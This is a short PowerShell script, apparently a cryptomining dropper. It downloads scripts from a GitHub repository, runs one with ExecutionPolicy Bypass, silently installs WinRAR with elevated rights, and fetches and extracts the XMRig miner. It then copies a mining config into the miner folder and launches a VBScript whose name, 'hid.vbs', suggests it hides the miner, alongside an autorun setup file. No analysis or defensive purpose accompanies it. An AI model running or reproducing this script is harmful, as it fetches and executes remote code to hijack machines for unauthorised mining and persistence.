Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/coin/refs/heads/main/configure_system.ps1 -OutFile C:\configure_system.ps1
Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/coin/refs/heads/main/hid.vbs -OutFile C:\hid.vbs
Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/coin/refs/heads/main/AUTORUN_SETUP.cmd -OutFile C:\AUTORUN_SETUP.cmd
powershell.exe -ExecutionPolicy Bypass -File "C:\configure_system.ps1"
Invoke-WebRequest -Uri 'https://www.win-rar.com/fileadmin/winrar-versions/winrar/winrar-x64-701.exe' -OutFile 'C:\winrar-x64-701.exe'
Start-Process -FilePath 'C:\winrar-x64-701.exe' -ArgumentList '/S' -Verb RunAs
Invoke-WebRequest -Uri https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-gcc-win64.zip -OutFile C:\xmrig-6.22.2-gcc-win64.zip
& 'C:\Program Files\WinRAR\WinRAR.exe' x -ibck -y 'C:\xmrig-6.22.2-gcc-win64.zip' 'C:\'
Start-Sleep -Seconds 2
Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/coin/refs/heads/main/XRPRUN.cmd -OutFile C:\XRPRUN.cmd
Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/coin/refs/heads/main/config.json -OutFile C:\config.json
Copy-Item -Path C:\XRPRUN.cmd -Destination C:\xmrig-6.22.2\XRPRUN.cmd -Force
Copy-Item -Path C:\config.json -Destination C:\xmrig-6.22.2\config.json -Force
Start-Process -FilePath "wscript.exe" -ArgumentList "C:\hid.vbs"
powershell.exe exit
